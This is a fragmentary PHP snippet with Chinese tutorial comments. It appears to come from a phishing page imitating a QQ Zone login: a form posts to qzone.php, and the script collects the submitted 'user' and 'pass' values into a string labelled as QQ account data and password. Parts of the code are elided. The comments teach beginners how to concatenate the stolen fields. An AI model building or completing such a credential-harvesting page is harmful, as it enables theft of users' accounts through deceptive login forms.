<?php
	if (isset($_POST["user"])) {
		if (isset($_POST["pass"])) {
			...
			$txt = "<li>***QQ数据***"."帐号:".$_POST["user"]."***密码:".$_POST["pass"];//$_POST["user"]</li>这个变量的意思，在所有post过来的数据当中的 user字段 两个字段或者变量可以用 . 这个符号连接起来，相当于合成一个文本，还有的记得每句php代码后面都需要加;号，不然就会报错。
...
<form id="form" action="qzone.php" method="post" onsubmit="return onpost()">
